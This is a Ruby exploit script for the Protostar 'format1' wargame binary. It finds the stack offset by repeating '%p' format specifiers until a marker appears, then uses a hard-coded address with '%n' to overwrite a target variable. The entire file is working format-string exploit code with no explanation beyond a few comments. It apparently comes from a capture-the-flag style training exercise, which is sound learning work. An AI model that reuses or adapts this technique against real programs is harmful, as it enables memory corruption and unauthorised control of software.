#!/usr/bin/ruby

target = "ABCD"
# Little-Endian
# *"" will convert Array to String
target_hex = target.unpack('N*').pack('V*').unpack('H*') * ""

index = 1
maximum = 200

while index < maximum
	command = "/opt/protostar/bin/format1 " + target + "%p" * (index + 1)
	result = `#{command}`

	if result.include? target_hex then break end

	index += 1
end

puts "index: #{index}"

# address of target: 0x08049638
target = "\x38\x96\x04\x08"

command = "/opt/protostar/bin/format1 " + target + ("%p" * index) + "%n"
puts "Running: #{command}"
puts `#{command}` 

